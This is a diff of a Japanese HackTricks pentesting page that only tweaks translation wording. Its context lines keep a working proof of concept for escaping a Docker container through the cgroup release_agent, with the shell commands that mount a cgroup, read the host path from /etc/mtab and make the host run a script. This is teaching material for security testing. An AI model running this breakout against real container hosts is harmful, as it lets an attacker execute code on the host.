@@ -34,21 +34,21 @@ The proof of concept (PoC) demonstrates a method to exploit cgroups by creating 
 ```shell
 mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
 ```
-2. **子Cgroupの設定:**
+2. **子Cgroupを設定する:**
 * マウントされたCgroupディレクトリ内に「x」という名前の子Cgroupが作成されます。
 * 「x」Cgroupのnotify\_on\_releaseファイルに1を書き込むことで通知が有効になります。
 ```shell
 echo 1 > /tmp/cgrp/x/notify_on_release
 ```
 3. **リリースエージェントの設定:**
-* ホスト上のコンテナのパスは、/etc/mtabファイルから取得されます。
-* 次に、cgroupのrelease\_agentファイルが、取得したホストパスにある/cmdという名前のスクリプトを実行するように設定されます。
+* ホスト上のコンテナのパスは /etc/mtab ファイルから取得されます。
+* 次に、cgroup の release\_agent ファイルが取得したホストパスにある /cmd という名前のスクリプトを実行するように設定されます。
 ```shell
 host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
 echo "$host_path/cmd" > /tmp/cgrp/release_agent
 ```
 4. **/cmd スクリプトの作成と設定:**
-* /cmd スクリプトはコンテナ内に作成され、ps aux を実行するように設定され、出力はコンテナ内の /output という名前のファイルにリダイレクトされます。ホスト上の /output の完全なパスが指定されます。
+* /cmd スクリプトはコンテナ内に作成され、ps aux を実行するように設定され、出力はコンテナ内の /output というファイルにリダイレクトされます。ホスト上の /output の完全なパスが指定されます。
 ```shell
 echo '#!/bin/sh' > /cmd
 echo "ps aux > $host_path/output" >> /cmd
@@ -70,7 +70,7 @@ GCPハッキングを学び、実践する：<img src="/.gitbook/assets/grte.png
 
 * [**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)を確認してください！
 * **💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**Telegramグループ**](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**をフォローしてください。**
-* **ハッキングのトリックを共有するには、[**HackTricks**](https://github.com/carlospolop/hacktricks)および[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のGitHubリポジトリにPRを提出してください。**
+* **ハッキングトリックを共有するには、[**HackTricks**](https://github.com/carlospolop/hacktricks)および[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のGitHubリポジトリにPRを提出してください。**
 
 </details>
 {% endhint %}
